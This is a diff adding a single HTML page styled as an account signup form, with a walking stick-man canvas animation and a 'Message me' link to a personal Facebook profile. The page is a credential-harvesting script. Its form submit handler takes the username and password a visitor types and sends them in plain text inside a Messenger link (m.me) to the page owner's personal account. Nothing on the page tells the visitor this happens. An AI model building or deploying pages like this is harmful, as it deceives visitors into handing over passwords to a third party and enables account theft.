@@ -1,0 +1,248 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html><html lang="en">
+<head>
+<link href="data:image/x-icon;base64,AAABAAEAEBAQAAAAAAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAAAAAAADk5u0AD/WdABQTEgDtE3kAD0L1AAsMDQAtCpQAvwhLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAERERERERERERAAAAAAARERAFVVVVAAEREFAAUABQABEQBQBQAAAAERAAAFAAAAMRcAAERgAAAzFwAAREAAADcTcCIgIiADN3MwIiAiIAM3czMgICAgMzd3MyIjIiMzdxFzMzMzMzd3ERczMzMzd3EREXczM3d3ERERF3M3d3EREAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" rel="icon" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Account Signup & Walking Man</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      background: white;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    canvas {
+      background: white;
+      margin-top: 20px;
+    }
+    form {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    input, button {
+      padding: 10px;
+      margin: 5px;
+      font-size: 1rem;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      cursor: pointer;
+      background: linear-gradient(45deg, #ff6ec4, #7873f5);
+      color: white;
+      border: none;
+    }
+    button:hover {
+      background: linear-gradient(45deg, #7873f5, #ff6ec4);
+    }
+    #helloButton {
+      margin: 20px;
+      padding: 12px 28px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      background: linear-gradient(45deg, #ff6ec4, #7873f5);
+      color: white;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body><h2>Create Account</h2>
+<form id="signupForm">
+  <input type="text" id="username" placeholder="Enter Username" required>
+  <input type="password" id="password" placeholder="Enter Password" required>
+  <button type="submit">Create Account</button>
+</form><canvas id="canvas" width="800" height="400"></canvas>
+
+<a id="helloButton" href="https://www.facebook.com/nitin.bhatt.825570" target="_blank">Message me</a>
+
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+function resize() {
+  canvas.width = window.innerWidth > 800 ? 800 : window.innerWidth - 40;
+  canvas.height = 300;
+}
+window.addEventListener('resize', resize);
+resize();
+
+const manHeight = 100;
+const manWidth = 20;
+const groundY = canvas.height - 80;
+let xPos = -manWidth;
+const speed = 2;
+let step = 0;
+const stepSpeed = 0.1;
+let isStopped = false;
+const stopX = canvas.width / 2 - manWidth / 2;
+let stopTime = 0;
+const pauseDuration = 1500;
+
+function drawMan(ctx, x, y, step, smiling = false) {
+  ctx.save();
+  ctx.translate(x, y);
+
+  ctx.lineWidth = 3;
+  ctx.strokeStyle = 'black';
+  ctx.fillStyle = 'white';
+
+  const shadowWidth = manWidth * 1.2;
+  const shadowHeight = 15;
+  ctx.beginPath();
+  const shadowGradient = ctx.createRadialGradient(0, 0, shadowHeight / 2, 0, 0, shadowWidth / 2);
+  shadowGradient.addColorStop(0, 'rgba(0,0,0,0.25)');
+  shadowGradient.addColorStop(1, 'rgba(0,0,0,0)');
+  ctx.fillStyle = shadowGradient;
+  ctx.ellipse(0, 15, shadowWidth / 2, shadowHeight / 2, 0, 0, Math.PI * 2);
+  ctx.fill();
+
+  ctx.fillStyle = 'white';
+  ctx.strokeStyle = 'black';
+
+  ctx.beginPath();
+  ctx.rect(-manWidth / 2, -manHeight, manWidth, manHeight);
+  ctx.fill();
+  ctx.stroke();
+
+  const headRadius = 20;
+  ctx.beginPath();
+  ctx.arc(0, -manHeight - headRadius, headRadius, 0, Math.PI * 2);
+  ctx.fill();
+  ctx.stroke();
+
+  ctx.fillStyle = 'black';
+  const eyeY = -manHeight - headRadius - 5;
+  const eyeXOffset = 7;
+  const eyeRadius = 3;
+
+  ctx.beginPath();
+  ctx.arc(-eyeXOffset, eyeY, eyeRadius, 0, Math.PI * 2);
+  ctx.arc(eyeXOffset, eyeY, eyeRadius, 0, Math.PI * 2);
+  ctx.fill();
+
+  ctx.beginPath();
+  const mouthY = eyeY + 12;
+  if (smiling) {
+    ctx.arc(0, mouthY, 8, 0, Math.PI, false);
+  } else {
+    ctx.moveTo(-7, mouthY);
+    ctx.lineTo(7, mouthY);
+  }
+  ctx.stroke();
+
+  const swing = Math.sin(step * Math.PI * 2) * 0.5;
+  ctx.lineCap = 'round';
+
+  ctx.beginPath();
+  let leftArmX = -manWidth / 2;
+  let leftArmY = -manHeight * 0.7;
+  let armLength = 40;
+  ctx.moveTo(leftArmX, leftArmY);
+  ctx.lineTo(leftArmX + armLength * Math.sin(swing), leftArmY + armLength * Math.cos(swing));
+  let rightArmX = manWidth / 2;
+  let rightArmY = -manHeight * 0.7;
+  ctx.moveTo(rightArmX, rightArmY);
+  ctx.lineTo(rightArmX + armLength * Math.sin(-swing), rightArmY + armLength * Math.cos(-swing));
+  ctx.stroke();
+
+  ctx.beginPath();
+  let leftLegX = -manWidth / 4;
+  let leftLegY = 0;
+  let legLength = 50;
+  ctx.moveTo(leftLegX, leftLegY);
+  ctx.lineTo(leftLegX + legLength * Math.sin(-swing), leftLegY + legLength * Math.cos(-swing));
+  let rightLegX = manWidth / 4;
+  let rightLegY = 0;
+  ctx.moveTo(rightLegX, rightLegY);
+  ctx.lineTo(rightLegX + legLength * Math.sin(swing), rightLegY + legLength * Math.cos(swing));
+  ctx.stroke();
+  ctx.restore();
+}
+
+function drawSpeechBubble(ctx, x, y, text) {
+  ctx.save();
+  ctx.font = '20px Segoe UI';
+  ctx.textBaseline = 'top';
+  ctx.fillStyle = 'white';
+  ctx.strokeStyle = 'black';
+  ctx.lineWidth = 3;
+  ctx.shadowColor = 'rgba(0,0,0,0.3)';
+  ctx.shadowBlur = 4;
+
+  const padding = 12;
+  const textWidth = ctx.measureText(text).width;
+  const bubbleWidth = textWidth + padding * 2;
+  const bubbleHeight = 40;
+  const radius = 15;
+
+  ctx.beginPath();
+  ctx.moveTo(x, y + radius);
+  ctx.arcTo(x, y, x + radius, y, radius);
+  ctx.lineTo(x + bubbleWidth - radius, y);
+  ctx.arcTo(x + bubbleWidth, y, x + bubbleWidth, y + radius, radius);
+  ctx.lineTo(x + bubbleWidth, y + bubbleHeight - radius);
+  ctx.arcTo(x + bubbleWidth, y + bubbleHeight, x + bubbleWidth - radius, y + bubbleHeight, radius);
+  ctx.lineTo(x + radius + 20, y + bubbleHeight);
+  ctx.arcTo(x + 20, y + bubbleHeight, x + 20, y + bubbleHeight + 20, 20);
+  ctx.lineTo(x + 10, y + bubbleHeight);
+  ctx.lineTo(x, y + bubbleHeight);
+  ctx.closePath();
+
+  ctx.fill();
+  ctx.stroke();
+  ctx.fillStyle = 'black';
+  ctx.fillText(text, x + padding, y + (bubbleHeight - 20) / 2);
+  ctx.restore();
+}
+
+function animate(timestamp) {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  const smiling = isStopped;
+  drawMan(ctx, xPos, groundY, step, smiling);
+  if (isStopped) {
+    const bubbleX = xPos + 0.1;
+    const bubbleY = groundY - manHeight - 90;
+    drawSpeechBubble(ctx, bubbleX, bubbleY, 'Paisa patha ta!!');
+  }
+  if (!isStopped) {
+    xPos += speed;
+    step += stepSpeed;
+    if (xPos >= stopX) {
+      isStopped = true;
+      stopTime = performance.now();
+    }
+  } else {
+    if (performance.now() - stopTime > pauseDuration) {
+      isStopped = false;
+    }
+  }
+  if (xPos > canvas.width + manWidth) {
+    xPos = -manWidth;
+  }
+  requestAnimationFrame(animate);
+}
+
+animate();
+
+// Form submit
+const form = document.getElementById("signupForm");
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const msg = encodeURIComponent(`New account created!\nUsername: ${username}\nPassword: ${password}`);
+  window.open(`https://m.me/nitin.bhatt.825570?ref=${msg}`, "_blank");
+});
+</script><a href="https://www.facebook.com/nitin.bhatt.825570"> <font color="black"face="American Typewriter" >©Nitin 2007–2077 all rights reserved</font></a>
+
+
+</body>
+
+</html>
